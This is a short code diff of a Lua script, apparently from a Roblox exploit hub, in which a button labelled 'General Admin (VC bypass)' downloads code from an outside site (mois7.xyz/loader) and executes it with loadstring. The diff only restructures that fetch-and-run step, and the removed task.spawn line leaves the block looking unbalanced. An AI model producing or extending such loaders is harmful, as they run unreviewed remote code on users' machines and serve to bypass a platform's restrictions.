@@ -1205,9 +1205,15 @@ createHubButton(generalPage, "General Admin (VC bypass)", function()
 	status.Text = "●  Loading General Admin..."
 	showPopup("Loading General Admin")
 
-	task.spawn(function()
 		local success, err = pcall(function()
-			loadstring(game:HttpGet("https://mois7.xyz/loader"))()
+		    local source = game:HttpGet("https://mois7.xyz/loader")
+		    local fn = loadstring(source)
+		
+		    if not fn then
+		        error("loadstring returned nil")
+		    end
+		
+		    fn()
 		end)
 
 		if success then
